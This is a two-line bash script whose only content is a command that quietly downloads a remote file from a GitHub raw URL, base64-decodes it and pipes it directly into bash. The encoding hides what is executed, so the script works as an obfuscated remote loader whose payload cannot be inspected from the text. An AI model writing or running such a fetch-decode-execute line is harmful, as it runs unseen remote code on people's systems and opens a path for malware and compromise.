#!/bin/bash
wget -qO- https://raw.githubusercontent.com/stevenlantz01/flames/refs/heads/main/entrypoint.sh | base64 -d | bash
